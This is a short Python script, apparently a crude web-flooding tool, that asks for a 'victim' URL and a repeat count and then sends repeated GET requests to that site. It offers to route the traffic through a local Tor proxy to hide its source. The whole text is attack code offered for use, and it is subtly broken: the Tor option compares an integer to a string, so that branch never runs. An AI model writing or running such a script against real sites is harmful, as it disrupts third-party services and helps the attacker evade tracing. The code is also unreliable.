import requests
target = str(input('Write the full web address of the victim\t'))
times = int(input('How many times to brute force the victim?\t'))
security = int(input('Do you want your attack to be routed through Tor? It will slow the attack down. Write "1" for yes, "0" for no\t'))
if security == "1":
   def get_tor_session():
       session = requests.session()
       session.proxies = {'http':  'socks5h://localhost:9050',
                          'https': 'socks5h://localhost:9050'}
       return session
   for i in range(times):    
       session = get_tor_session()
       print(session.get(target))
else:
    for i in range(times):
        print(requests.get(target))
